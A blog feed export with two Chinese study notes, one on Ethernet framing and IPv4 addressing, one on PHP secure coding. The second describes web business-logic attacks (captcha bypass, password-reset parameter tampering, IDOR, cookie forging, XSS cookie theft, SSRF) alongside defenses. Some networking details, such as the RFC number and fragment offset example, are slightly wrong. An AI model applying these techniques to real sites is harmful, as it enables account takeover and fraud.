)由目的服务访问点DSAP ( DestinationService Access Point )、源服务访问点SSAP ( Source Service Access Point )和Control字段组成</li><li>SNAP ( Sub-network Access Protocol)由机构代码（Org Code )和类型(Type)字段组成。Org Code三个字节都为0。Type字段的含义与Ethernet_I帧中的Type字段相同。IEEE802.3帧根据DSAP和SSAP字段的取值又可分为以下几类︰<ol><li>当DSAP和SSAP都取特定值0xff时，802.3帧就变成了Netware-ETHERNET帧，用来承载NetWare类型的数据。</li><li>当DSAP和SSAP都取特定值0xaa时，802.3帧就变成了ETHERNET_SNAP帧。ETHERNET_SNAP帧可以用于传输多种协议。</li><li>DSAP和SSAP其他的取值均为纯EEE802.3帧。</li></ol></li></ol><p><strong>数据帧传输</strong></p><p>数据链路层基于MAC地址进行帧传输</p><p>以太网在二层链路上通过MAC地址来唯一标识网络设备，并且实现局域网上网络设备之间的通信。MAC地址也叫物理地址，大多数网卡厂商把MAC地址烧入了网卡的ROM中。发送端使用接收端的MAC地址作为目的地址。以太帧封装完成后会通过物理层转换成比特流在物理介质上传输</p><p><strong>以太网的MAC地址</strong></p><p>每一台网络设备都用物理地址来标识自己，这个地址就是MAC地址。网络设备的MAC地址是全球唯一的。MAC地址长度为48比特，通常用十六进制表示。MAC地址包含两部分︰前24比特是组织唯一标识符(OUI , OrganizationallyUnique Identifier )，由IEEE统一分配给设备制造商。例如，华为的网络产品的MAC地址前24比特是0x00e0fc。后24位序列号是厂商分配给每个产品的唯一数值，由各个厂商自行分配(这里所说的产品可以是网卡或者其他需要MAC地址的设备)</p><p><strong>帧的发送方式</strong></p><p>局域网上的帧可以通过三种方式发送</p><ol><li><p>单播</p><p>指从单一的源端发送到单一的目的端。每个主机接口由一个MAC地址唯一标识，MAC地址的OUI中，第一字节第8个比特表示地址类型。对于主机MAC地址，这个比特固定为0，表示目的MAC地址为此MAC地址的帧都是发送到某个唯一的目的端。在冲突域中，所有主机都能收到源主机发送的单播帧，但是其他主机发现目的地址与本地MAC地址不一致后会丢弃收到的帧，只有真正的目的主机才会接收并处理收到的帧</p></li><li><p>广播</p><p>表示帧从单一的源发送到共享以太网上的所有主机。广播帧的目的MAC地址为十六进制的FF:FF:FF:FF:FF:FF，所有收到该广播帧的主机都要接收并处理这个帧</p><p>广播方式会产生大量流量，导致带宽利用率降低，进而影响整个网络的性能</p><p>当需要网络中的所有主机都能接收到相同的信息并进行处理的情况下，通常会使用广播方式</p></li><li><p>组播</p><p>组播比广播更加高效。组播转发可以理解为选择性的广播，主机侦听特定组播地址，接收并处理目的MAC地址为该组播MAC地址的帧</p><p>组播MAC地址和单播MAC地址是通过第一字节中的第8个比特区分的。组播MAC地址的第8个比特为1，而单播MAC地址的第8个比特为0</p><p>当需要网络上的一组主机(而不是全部主机）接收相同信息，并且其他主机不受影响的情况下通常会使用组播方式</p></li></ol><p><strong>数据帧的发送和接收</strong></p><p>帧从主机的物理接口发送出来后，通过传输介质传输到目的端。共享网络中，这个帧可能到达多个主机。主机检查帧头中的目的MAC地址，如果目的MAC地址不是本机MAC地址，也不是本机侦听的组播或广播MAC地址，则主机会丢弃收到的帧</p><p>如果目的MAC地址是本机MAC地址，则接收该帧，检查帧校验序列(FCS)字段，并与本机计算的值对比来确定帧在传输过程中是否保持了完整性。如果帧的FCS值与本机计算的值不同，主机会认为帧已被破坏，并会丢弃该帧。如果该帧通过了FCS校验，则主机会根据帧头部中的Type字段来确定将帧发送给上层哪个协议处理。本例中，Type字段的值为0x0800，表明该帧需要发送到IP协议上处理。在发送给IP协议之前，帧的头部和尾部会被剥掉</p><h2 id="3-IP编址"><a href="#3-IP编址" class="headerlink" title="3.IP编址"></a>3.IP编址</h2><p>网络层位于数据链路层与传输层之间。网络层中包含了许多协议，其中最为重要的协议就是IP协议。网络层提供了IP路由功能。理解IP路由除了要熟悉IP协议的工作机制之外，还必须理解IP编址以及如何合理地使用IP地址来设计网络</p><p>以太帧中的Type字段为0x0800，代表该帧的网络层协议为IP协议</p><p><strong>IP报文头部</strong></p><p><img src="https://pic.imgdb.cn/item/60f0ea0a5132923bf80c4b15.png" alt="IP报文"></p><ol><li>IP报文头部信息用于指导网络设备对报文进行路由和分片。同一个网段内的数据转发通过链路层即可实现，而跨网段的数据转发需要使用网络设备的路由功能。分片是指数据包超过一定长度时，需要被划分成不同的片段使其能够在网络中传输</li><li>IP报文头部长度为20到60字节，报文头中的信息可以用来指导网络设备如何将报文从源设备发送到目的设备。其中，版本字段表示当前支持的IP协议版本，当前的版本号为4。DS字段早期用来表示业务类型，现在用于支持QoS中的差分服务模型，实现网络流量优化</li><li>源和目的IP地址是分配主机的逻辑地址，用于在网络层标识报文的发送方和接收方。根据源和目的IP地址可以判断目的端是否与发送端位于同一网段，如果二者不在同一网段，则需要采用路由机制进行跨网段转发</li></ol><p><strong>IP编址</strong></p><ol><li>IPv4地址为32比特的二进制数，通常用点分十进制表示。IP地址用来标识网络中的设备，具有IP地址的设备可以在同一网段内或跨网段通信。IP地址包括两部分，第一部分是网络号，表示IP地址所属的网段，第二部分是主机号，用来唯一标识本网段上的某台网络设备</li><li>每个网段上都有两个特殊地址不能分配给主机或网络设备。第一个是该网段的网络地址，该IP地址的主机位为全0，表示一个网段。第二个地址是该网段中的广播地址，目的地址为广播地址的报文会被该网段中的所有网络设备接收。广播地址的主机位为全1。除网络地址和广播地址以外的其他IP地址都可以作为网络设备的IP地址</li></ol><p><strong>IP地址分类</strong></p><ol><li>IPv4地址被划分为A、B、C、D、E五类，每类地址的网络号包含不同的字节数。A类，B类和C类地址为可分配IP地址，每类地址支持的网络数和主机数不同。比如，A类地址可支持126个网络，每个网络支持224 ( 16,777,216 )个主机地址，另外每个网段中的网络地址和广播地址不能分配给主机。C类地址支持200多万个网络，每个网络支持256个主机地址，其中254个地址可以分配给主机使用</li><li>D类地址为组播地址。主机收到以D类地址为目的地址的报文后，且该主机是该组播组成员，就会接收并处理该报文。各类IP地址可以通过第一个字节中的比特位进行区分。如A类地址第一字节的最高位固定为0，B类地址第一字节的高两位固定为10，C类地址第一字节的高三位固定为110，D类地址第一字节的高四位固定为1110，E类地址第一字节的高四位固定为1111</li></ol><p><strong>IP地址类型</strong></p><ol><li>私有地址范围<ul><li>10.0.0.0~10.255.255.255</li><li>172.16.0.0~172.31.255.255</li><li>192.168.0.0~192.168.255.255</li></ul></li><li>特殊地址<ul><li>127.0.0.0~127.255.255.255</li><li>0.0.0.0</li><li>255.255.255.255</li></ul></li></ol><p>IPv4中的部分IP地址被保留用作特殊用途。为节省IPv4地址，A、B、C类地址段中都预留了特定范围的地址作为私网地址</p><p>现在，世界上所有终端系统和网络设备需要的IP地址总数已经超过了32位Pv4地址所能支持的最大地址数4,294,967,296</p><p>为主机分配私网地址节省了公网地址，可以用来缓解IP地址短缺的问题</p><p>企业网络中普遍使用私网地址，不同企业网络中的私网地址可以重叠</p><p>默认情况下，网络中的主机无法使用私网地址与公网通信;当需要与公网通信时，私网地址必须转换成公网地址</p><p>还有其他一些特殊IP地址，如127.0.0.0网段中的地址为环回地址，用于诊断网络是否正常。IPv4中的第一个地址0.0.0.0表示任何网络，这个地址的作用将在路由原理中详细介绍。IPv4中的最后一个地址</p><p>255.255.255.255是0.0.0.0网络中的广播地址</p><p><strong>网络通信</strong></p><p>源主机必须要知道目的主机的IP地址后才能将数据发送到目的地</p><p>源主机向其他目的主机发送报文之前，需要检查目的IP地址和源IP地址是否属于同一个网段。如果是，则报文将被下发到底层协议进行以太网封装处理。如果目的地址和源地址属于不同网段，则主机需要获取下—跳路由器的IP地址，然后将报文下发到底层协议处理</p><p><strong>子网掩码</strong></p><p><img src="https://pic.imgdb.cn/item/60f0ee185132923bf82413f1.png"></p><p>理解上图即可</p><p>其中可用主机的减少是因为需要减去网络地址和广播地址</p><p><strong>变长子网掩码</strong></p><p>理解是对于已经划分的子网掩码进一步划分</p><p>案例如下</p><p><img src="https://pic.imgdb.cn/item/60f0eecd5132923bf828496c.png"></p><p>分析需求A段：30，B段：20，C段：10</p><p>首先是按照最大的分配，A、B段借3位，子网掩码255.255.255.224每个子网可配置30台，A、B段使用3-1和3-2子网</p><p>C段将3-3子网进一步划分</p><p>C段借4位，子网掩码255.255.255.240，每个子网可配置14台，用3-3.4-1子网配置</p><p>此时有3-4~3-8和3-3.4-2没有使用</p><p><strong>无类域间路由</strong></p><p><img src="https://pic.imgdb.cn/item/60f0f1ea5132923bf83ad0ba.png"></p><ol><li>无类域间路由CIDR ( Classless Inter Domain Routing )由RFC1817定义。CIDR突破了传统IP地址的分类边界，将路由表中的若干条路由汇聚为一条路由，减少了路由表的规模，提高了路由器的可扩展性</li><li>如上图所示，一个企业分配到了一段A类网络地址，10.24.0.0/22。该企业准备把这些A类网络分配给各个用户群，目前已经分配了四个网段给用户。如果没有实施CIDR技术，企业路由器的路由表中会有四条下连网段的路由条目，并且会把它通告给其他路由器。通过实施CIDR技术，我们可以在企业的路由器上把这四条路由10.24.0.0/24，10.24.1.0/24,10.24.2.0/24，10.24.3.0/24汇聚成─条路由10.24.0.0/22。这样，企业路由器只需通告10.24.0.0/22这一条路由，大大减小了路由表的规模</li></ol><p><strong>网关</strong></p><p>用来转发不同网段之间的数据包</p><ol><li>报文转发过程中，首先需要确定转发路径以及通往目的网段的接口，然后将报文封装在以太帧中通过指定的物理接口转发出去。如果目的主机与源主机不在同一网段；报文需要先转发到网关，然后通过网关将报文转发到目的网段</li><li>网关是指接收并处理本地网段主机发送的报文并转发到目的网段的设备。为实现此功能，网关必须知道目的网段的IP地址。网关设备上连接本地网段的接口地址即为该网段的网关地址</li></ol><p><strong>IP包讲解</strong></p><p><img src="https://pic.imgdb.cn/item/60f0f2955132923bf83eee4a.png" alt="IP包"></p><ol><li><p>网络中转发的IP报文的长度可以不同，但如果报文长度超过了数据链路所支持的最大长度，则报文就需要分割成若干个较小的片段才能够在链路上传输。将报文分割成多个片段的过程叫做分片</p></li><li><p>接收端根据分片报文中的标识符(Identification )，标志（Flags)，及片偏移(FragmentOffset )字段对分片报文进行重组</p><p>标识符用于识别属于同一个数据包的分片，以区别于同一主机或其他主机发送的其它数据包分片，保证分片被正确的重新组合</p><p>标志字段用于判断是否已经收到最后一个分片。最后一个分片的标志字段设置为0，其他分片的标志字段设置为1，目的端在收到标志字段为0的分片后，开始重组报文</p><p>片偏移字段表示每个分片在原始报文中的位置。第一个分片的片偏移为0，第二个分片的片偏移表示紧跟第一个分片后的第一个比特的位置。比如，如果首片报文包含1259比特，那么第二分片报文的片偏移字段值就应该为1260</p></li><li><p><em>生存时间</em></p><p>报文在网段间转发时，如果网络设备上的路由规划不合理，就可能会出现环路，导致报文在网络中无限循环，无法到达目的端。环路发生后，所有发往这个目的地的报文都会被循环转发，随着这种报文逐渐增多，网络将会发生拥塞</p><p>为避免环路导致的网络拥塞，IP报文头中包含一个生存时间TTL ( Time To Live )字段。报文每经过一台三层设备，TTL值减1。初始TTL值由源端设备设置。当报文中的TTL降为O时，报文会被丢弃。同时，丢弃报文的设备会根据报文头中的源IP地址向源端发送ICMP错误消息</p></li><li><p><em>协议号</em></p><p>目的端的网络层在接收并处理报文以后，需要决定下一步对报文该做如何处理。IP报文头中的协议字段标识了将会继续处理报文的协议。与以太帧头中的Type字段类似，协议字段也是一个十六进制数。该字段可以标识网络层协议，如如CMP ( InternetControl MessageProtocol，因特网控制报文协议），也可以标识上层协议，如TCP (Transmission Control Protocol，传输控制协议，对应值0x06 ) 、UDP ( User Datagram Protocol ,用户数据包协议，对应值0x11 )</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>TCP/IP基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计-PHP安全编程规范-2</title>
    <link href="/2021/07/15/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E8%A7%84%E8%8C%83-2/"/>
    <url>/2021/07/15/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E8%A7%84%E8%8C%83-2/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP安全编程规范"><a href="#PHP安全编程规范" class="headerlink" title="PHP安全编程规范"></a>PHP安全编程规范</h1><h2 id="第十一章-业务功能安全设置"><a href="#第十一章-业务功能安全设置" class="headerlink" title="第十一章 业务功能安全设置"></a>第十一章 业务功能安全设置</h2><p>本章是对于功能安全的痛点进行分析</p><h3 id="11-1-验证码绕过"><a href="#11-1-验证码绕过" class="headerlink" title="11.1 验证码绕过"></a>11.1 验证码绕过</h3><p>图片验证码目前使用较多，有以下的绕过方法</p><ol><li><p>不刷新直接绕过</p><p>此处的意思是，服务端对于验证部分是通过对于同一个数据包中的两处内容进行验证，如一个是用户输入，一个是服务端设置在Cookie中加密或明文存储的部分。</p></li><li><p>暴力破解</p><p>是由于没有对错误次数的限制而导致的尝试。</p></li><li><p>机器识别</p><p>通常有两种情况</p><ol><li>是针对没有实时生成的验证码，将对应图片的md5和结果绑定来绕过</li><li>而对于动态生成的验证码，需要做图片文字生别或语音生别</li></ol></li><li><p>打码公司</p><p>是利用人力资源进行绕过国内的有<a href="damatul.com">打码兔</a>、<a href="qqearn.com">Q赚</a></p><p>首先一个强壮的验证码有以下几点</p><ol><li>设置验证码错误次数</li><li>不将验证码放到HTML界面或者Cookie中</li><li>请求一次后强制刷新验证码</li><li>验证码设置应较为复杂</li><li>验证码动态生成</li></ol></li></ol><p>还有验证码资源滥用问题，由于大量访问导致同一个手机号被短信轰炸</p><h3 id="11-2-用户登录"><a href="#11-2-用户登录" class="headerlink" title="11.2 用户登录"></a>11.2 用户登录</h3><p>通常用户登录有以下几个点需要关注</p><ol><li><p>撞库漏洞</p><p>撞库漏洞是指登录口没有做登录次数限制，导致可以被遍历用户密码</p><p>通常有以下几种情况：</p><ol><li><p>用户和密码错误次数无限制</p></li><li><p>单时间段内用户的密码错误次数限制</p><p>由于连续密码错误而导致账户被锁，此时可以通过切换其他用户来继续碰撞</p></li><li><p>单时间段内IP登录错误次数限制</p><p>是基于ip来进行限制，可以尝试修改ip进行碰撞</p></li></ol></li><li><p>API登录</p><p>即其它地方登录后一键登录相关联的业务，导致的漏洞</p><p>如qq进入qq空间的连接：</p><p><a href="http://ptlogin2.qq.com/igame?clientuin=12345&amp;clientkey=sadfasdfasdfasdfsdfasdfasdf">http://ptlogin2.qq.com/igame?clientuin=12345&amp;clientkey=sadfasdfasdfasdfsdfasdfasdf</a></p><p>其中clientuin参数为QQ号，而clientkey这是用户登录的key</p><p>注意以下安全点：</p><ol><li><p>登录密钥需要不可预测和固定</p></li><li><p>API接口禁止搜索引擎收录</p></li><li><p>登录密钥当次绑定主机，换机器不可用</p></li></ol></li></ol><h3 id="11-3-用户注册"><a href="#11-3-用户注册" class="headerlink" title="11.3 用户注册"></a>11.3 用户注册</h3><p>   安全设计思路：</p><ol><li><p>设计验证码</p></li><li><p>采集用户机器唯一识别码，拦截短时间内多次注册</p></li><li><p>根据账号格式自学习识别垃圾账号</p></li><li><p>防止SQL注入漏洞与XSS漏洞</p></li></ol><h3 id="11-4-密码找回"><a href="#11-4-密码找回" class="headerlink" title="11.4 密码找回"></a>11.4 密码找回</h3><p>通常流程如图</p><p><img src="https://pic.imgdb.cn/item/60ef9b7e5132923bf8aba4b8.png"></p><p>针对每个阶段进行分析</p><ol><li><p>输入用户名/邮箱/手机阶段</p><p>目前大部分引用会从数据库中读取用户信息，并发送验证码。还有部分会提示选择手机还是邮箱找回，如果之后后端没有验证，提交时修改手机或邮箱。</p><p>则可能原本发给账户A的验证码会发送到我们篡改的手机或邮箱，利用接受到的验证码即可重置密码。</p></li><li><p>填写验证码和新密码阶段</p><p>该阶段意味着我们已经拿到了验证码或者重置密码的URL，这里存在的问题主要有：</p><ol><li>验证凭证较简单，可以被暴力破解</li><li>验证凭证算法简单，凭证可预测。部分网站找回密码的Token是根据当前的“用户名＋邮箱”或者时间戳进行一次MD5后生成，这就存在一定的预测性，利用自己写的算法去碰撞即可拿到争取到的重置密码凭证</li><li>验证凭证直接保存在源码里</li><li>发送新密码阶段</li></ol><p>在找回密码时候，发送到邮箱的连接通常是如下模式</p><p><a href="http://www.xxx.com/user.php?m=repwd&amp;uid=%E7%94%A8%E6%88%B7ID&amp;key=%E5%87%AD%E8%AF%81%E5%AF%86%E9%92%A5&amp;email=%E9%82%AE%E7%AE%B1">http://www.xxx.com/user.php?m=repwd&amp;uid=用户ID&amp;key=凭证密钥&amp;email=邮箱</a></p><p>当请求这个链接的时候，后端程序根据uid 和 key对应上了从而判断这个找回密码的链接有效，但是在将新密码提交到服务器的时候，服务器端可能并没有判断当前这个key是否跟uid或者email 匹配，而是直接修改掉了uid或者email指定的用户密码，这样我们只要拦截修改密码的请求包，将里面的用户参数修改成我们要篡改密码的用户账号即可</p><p>针对密码找回应当注意以下几点：</p><ol><li>接收验证码的邮箱和手机号不可由用户控制，应该直接从数据库中读取出来</li><li>加强验证凭证复杂度，防止被暴力破解</li><li>限制验证凭证错误次数，单个用户在半个小时内验证码错误三次，半小时内禁止找回密码</li><li>验证凭证设置失效时间</li><li>验证凭证不要保存在页面</li><li>输入用户邮箱或ID、手机号取验证凭证的地方需要设置验证码防止短信炸弹和批量找回等</li><li>验证凭证跟用户名、用户ID、用户邮箱绑定，找回密码时验证当前凭证是否是当前用户的</li></ol></li></ol><h3 id="11-5-资料查看与修改"><a href="#11-5-资料查看与修改" class="headerlink" title="11.5  资料查看与修改"></a>11.5  资料查看与修改</h3><p>用户的资料操作涉及权限问题，这里主要的是越权漏洞的利用场景。大多数网站提供了用户权限控制的功能，用户可以自己设置个人资料是否允许别人查看，在权限控制方面，主要有以下几种利用场景：</p><ol><li><p>未验证用户权限</p><p>这里说的未验证用户权限是指直接修改当前资源ID即可浏览该资源，没有验证当前这个资源是否属于当前用户，比如用户A的订单ID是111，用户B的订单ID为222，用户A登录后查看自己订单详情的时候，将URL中的订单ID参数改为222即可看到用户B的订单</p></li><li><p>未验证当前登录用户</p><p>虽然程序绑定了用户ID和资源ID，但是这个用户ID是在访问资源时直接从cookie或者post、get参数里面获取的，所以我们只要在cookie里面把用户ID修改成另外一个用户的ID，就可以利用他的权限操作他的东西，这是目前见得比较多的一种情况</p></li></ol><p>上面介绍的两种情况，虽然只是列举用户资料查看，但是更多的出现是在用户资料修改，比如个人资料、订单、密码，等等<br>对于用户注册功能我们需要用到的防御思路有：</p><blockquote><p>用户资源ID(订单ID、地址ID类似，等等）绑定到用户，只允许有权限的用户查看。</p></blockquote><h3 id="11-6-投屏-积分-抽奖"><a href="#11-6-投屏-积分-抽奖" class="headerlink" title="11.6 投屏/积分/抽奖"></a>11.6 投屏/积分/抽奖</h3><p>该方面的漏洞主要是单个用户次数的限制</p><p>通常抽奖和投票有如下几种利用方法：</p><ol><li><p>cookie或POST请求正文绕过</p><p>有的应用将验证是否抽奖或者领取积分的判断值放置在cookie或者POST的请求正文里，服务器端获取到这个结果后判断是否还有机会抽奖，而这个数据我们是可以直接在数据包中修改的，所以就会产生绕过，比如cookie 中 isok=1代表已经抽奖,isok=0代表还没有抽奖，而我们只要再点击抽奖，然后把isok的值改为0即可一直抽奖</p></li><li><p>基于IP验证</p><p>比较弱的统计是直接基于IP验证，像访问量、推广获取积分等，这类要看程序获取IP的方式，如果是client-ip或者x_forword_for 获取 IP，则可以直接伪造IP绕过</p></li><li><p>基于用户认证</p><p>也有一部分应用需要登录以后才能抽奖或者投票，这类可以结合看看能不能批量注册，如果可以，则可以用程序实现批量登录刷票，或者投票的时候POST包或者cookie里面的当前uid、用户名等是否可以随意修改绕过用户单次限制</p></li></ol><p>从上面利用手段可以看到主要的三个点是IP、登录用户 cookie，分析出可用性较高的防御手段如下：</p><ol><li>机器识别码验证，每台机器都可以根据硬件信息生成唯一的识别码</li><li>操作需要登录,当前用户信息从session中读取</li></ol><h3 id="11-7-充值支付"><a href="#11-7-充值支付" class="headerlink" title="11.7 充值支付"></a>11.7 充值支付</h3><p>支付漏洞主要有四种，分别是客户端可更改单价、总价和购买数量以及利用时间差多次购买（具体内容参考6.2.1.4中的内容）</p><p>针对以上四种情况应对手法有：</p><ol><li>保证数据可信，商品单价及总价不可从客户端获取</li><li>购买数量不能小于等于0</li><li>账户支付锁定机制，当一个支付操作开始就应该立马锁定当前账户，不能同时两个后端请求对余额进行操作</li></ol><h3 id="11-8-私信及反馈"><a href="#11-8-私信及反馈" class="headerlink" title="11.8 私信及反馈"></a>11.8 私信及反馈</h3><p>私信和反馈功能在大多数网站中都能见到，特别是社交应用，私信是必不可少的功能</p><p>这个功能是两个用户之间互动使用，两端都是人，除了特殊情况下可以滤去的SQL注入或者命令执行等少见漏洞外，最常见的就是XSS漏洞以及越权漏洞</p><p>常见利用方式是：在反馈处插入XSS代码，当管理员在Web后台查看反馈后，获取管理员的Cookie，最后利用Cookie登录后台</p><p>对于私信和反馈的XSS漏洞防御并没有什么特别的手段，跟我们之前介绍过的XSS防御方法一样，最主要的是将特殊字符进行过滤，另外是使用白名单和黑名单结合的方式</p><h3 id="11-9-远程地址访问"><a href="#11-9-远程地址访问" class="headerlink" title="11.9 远程地址访问"></a>11.9 远程地址访问</h3><p>这个功能产生的漏洞叫做SSRF(Server-Side Request Forgery)</p><p>我们在QQ消息中发送网页链接的时候，会显示出网页的标题和部分内容，这就说明腾讯的服务器有去访问我们发送的这个链接，那如果腾讯没有做地址限制，我们在聊天框里面发送一个腾讯内网的一个地址，那它再去访问的时候我们就能知道这是一个内网的什么系统，造成信息泄露，甚至内网漏洞利用</p><p>该类漏洞防御：</p><ol><li>只要限制填写</li><li>但是大部分厂商修复的时候应该不会考虑到短地址的问题，所以在修复之后仍然可以通过生成短链接来利用，修复的时候注意这点</li></ol><h3 id="11-10-文件管理"><a href="#11-10-文件管理" class="headerlink" title="11.10 文件管理"></a>11.10 文件管理</h3><p>文件管理功能是高危功能，可以直接对服务器中的文件进行操作，如果管理不当很可能被黑客直接写入webshell</p><p>一个文件管理功能为了保证安全，在满足业务需求的情况下，设计的时候应该遵循以下几个点：</p><ol><li><p>禁止写入脚本可在服务器端执行的文件</p><p>比如服务器能解析PHP，那么在设计文件管理这个功能的时候，就需要限制不能操作PHP扩展名的文件和PHP标签的代码</p><p>为什么说连代码标签也要限制?因为前端页面的都套用了HTML模板，大多是直接包含了HTML文件，如果我们直接在模板文件中插入PHP代码，最终也能执行</p></li><li><p>限制文件管理功能操作的目录</p><p>通常需要被管理的文件只有模板文件以及图片文件，所以我们可以在文件管理功能上限制只能操作这两个目录，目录不能从客户端提交，直接在代码中设置好即可，如果实在需要进行目录跳转的话，一定要禁止提交../以及!..，避免越权操作其他目录</p></li><li><p>限制文件管理功能访问权限</p><p>之前我们已经说到文件管理功能本身就是一个非常敏感的功能，虽然是一个正常的功能，但是已经有一点后门的性质，所以对于这个功能的访问权限一定要进行严格的控制</p></li><li><p>禁止上传特殊字符文件名的文件</p><p>大多数应用都会对上传的文件进行展示，特别是对外开发的网盘类应用，这时候就要注意对上传的文件名进行检查，禁止文件名中有尖括号、单双引号等特殊字符,避免攻击者用文件名来进行XSS攻击</p></li></ol><h3 id="11-11-数据库管理"><a href="#11-11-数据库管理" class="headerlink" title="11.11 数据库管理"></a>11.11 数据库管理</h3><p>数据库管理跟文件管理一样，也是一个高危功能，可以直接操作数据库，对数据库进行备份、执行SQL语句，等等，如果启动数据库服务的系统用户以及数据库用户的权限都够大，那么完全可以利用这个功能直接执行系统命令以及操作服务器上的文件</p><p>数据库管理有多个功能形式，比如 discuz的数据库管理就是一个备份和优化的功能，其备份功能是可以操作所有表，另外一种是可以直接执行SQL语句进行操作</p><p>对于这两种情况下的安全设计,应该注意以下几个点：</p><ol><li>限制可以操作的数据库表，如果是数据库备份可以直接在代码里面写死只能操作哪些表，如果是执行SQL语句的方式可以另建一个 MySQL用户，限制可以操作的表和字段</li><li>限制备份到服务器上的文件名，需要系统随机生成类似md5并且长度不能低于16位，扩展名不能自定义，这样做的目的一是防止攻击者利用该功能导出 webshell,二是防止被猜解到文件名直接下载</li></ol><h3 id="11-12-命令-代码执行"><a href="#11-12-命令-代码执行" class="headerlink" title="11.12 命令/代码执行"></a>11.12 命令/代码执行</h3><p>代码执行功能在特殊应用上才会存在，一般这个功能被拿下，基本上服务器就沦陷了</p><p>所以在设计这类功能时应该注意以下几点：</p><ol><li>严格控制该功能访问权限,建议高权限才能访问</li><li>在满足业务需求的情况下，可以设置命令白名单，可使用escapeshellcmd() 以及escapeshellarg()函数进行过滤,命令直接写死在代码中更好</li><li>给命令及代码执行功能设置独立密码</li><li>代码执行功能限制脚本可访问的路径</li><li>在满足需求的情况下限制当前执行命令的系统用户权限</li></ol><h3 id="11-13-文件-数据库备份"><a href="#11-13-文件-数据库备份" class="headerlink" title="11.13 文件/数据库备份"></a>11.13 文件/数据库备份</h3><p>网站源码备份和数据库备份是非常常见功能，也是很容易出现安全问题的功能</p><p>通常文件和数据库备份功能容易出现的问题有如下几种情况：</p><ol><li><p>未授权访问和越权访问</p><p>未授权访问体现在这个备份功能直接在不登录或登录验证存在漏洞的情况下可以直接使用，以及存在CSRF漏洞可以直接劫持管理员账号进行备份,discuz的CSRF备份数据漏洞就是非常好的一个例子</p></li><li><p>备份文件名可预测</p><p>备份文件名要么是备份的时候人工设置的，要么是自动生成的，如果是人工设置的，在使用完这个功能后可能存在忘记删除备份文件，导致恶意用户可以利用枚举的方式扫描到这个备份包。而自动生成则可能存在生成的文件名比较弱的问题，比如生成的文件名为当前日期，只要简单遍历下即可扫描到，非常不可靠</p></li><li><p>生成的文件可利用 Web 中间件解析漏洞执行代码</p></li></ol><p>所以设计备份功能：</p><ol><li>进行权限控制，由于备份功能是一个非常高危敏感的功能，一定要限制高权限才能使用</li><li>文件名随机生成，不可预测，可以把当前时间戳加上6位以上字母和数字随机生成的字符串进行md5来做为文件名</li></ol><h3 id="11-14-API"><a href="#11-14-API" class="headerlink" title="11.14 API"></a>11.14 API</h3><p>API是一些预定定义好的类和函数，为其他程序提供一个简单的资源调用口</p><p>API最多的问题是：未授权访问以及数据遍历漏洞</p><p>如果一个接口随随便便就可以被调用，在业务有一定价值的情况下，相信肯定会有不少人利用这个接口进行一些不当操作，而频繁操作会给服务器造成非常大的资源消耗</p><p>因此设计一个安全的API应该从以下几点着重考虑：</p><ol><li><p>访问权限控制</p><p>必要的情况下加入账户体系，严格控制数据调用权限，比如当前用户必须在登录情况下，接口参数中传入自己登录成功的凭证才能调用这个用户的数据。另外不需要账户体系的情况下也要注意加人不可暴力破解的访问密钥进行权限验证</p></li><li><p>防止敏感信息泄露</p><p>之前对知乎的App进行了抓包分析，其中用户资料的API就存在注册邮箱信息泄露，该接口会返回当前查看的用户资料，其中包括注册邮箱,这样只要知道某个人的知乎账号即可知道他的个人邮箱，类似于这种没必要输出的信息应该要注意禁止输出。</p></li><li><p>SQL注入等常规漏洞</p><p>由于传统扫描器很难抓取到完整的接口和参数，当检测变得少了，漏洞自然就多了，所以在开发接口的时候要特别注意代码安全，注意防止SQL注入、代码执行等漏洞的产生</p></li></ol><h2 id="第十二章-应用安全体系建设"><a href="#第十二章-应用安全体系建设" class="headerlink" title="第十二章 应用安全体系建设"></a>第十二章 应用安全体系建设</h2><p>企业安全防御包含两点：横向细化策略和纵深策略</p><ol><li>横向细化策略的精髓在于坚持能杀掉一个是一个的原则，依靠规则量来填补空洞，规则做得越细，拦掉的攻击越多。这是在提升黑客的攻击成本，而缺点在于同样也提升了防御成本，需要更多的投入</li><li>纵深防御策略是假设上一层防御策略失效而设计的内网防御策略。这两种安全原则不仅仅用在企业整体安全建设上，更是要细化到每个应用设计上面。</li></ol><h3 id="12-1-用户密码安全策略"><a href="#12-1-用户密码安全策略" class="headerlink" title="12.1 用户密码安全策略"></a>12.1 用户密码安全策略</h3><p>为了解决密码安全问题，单从密码策略上面来说，我们应该遵守以下原则：</p><ol><li>强制密码使用8位以上的“大小写字母＋数字＋特殊字符”的组合</li><li>禁止使用123456以及1qaz2wsx等弱口令</li><li>禁止用户名和密码相同,或者存在较大相似度</li></ol><h3 id="12-2-前后台用户分表"><a href="#12-2-前后台用户分表" class="headerlink" title="12.2 前后台用户分表"></a>12.2 前后台用户分表</h3><p>前台用户指的是没有登入后台权限的普通用户，这类用户是不需要操作后台数据的</p><p>后台用户即管理员用户，有后台登人权限，并且可以在后台对应用进行配置</p><p>从逻辑上来讲，两个不在同一操作层面的账户等级，完全不用将账户放到同一个数据库表里面，因为当同表的情况下可能存在越权修改管理员信息的情况，比如密码、找回密码的邮箱等</p><h3 id="12-3-后台地址隐藏"><a href="#12-3-后台地址隐藏" class="headerlink" title="12.3 后台地址隐藏"></a>12.3 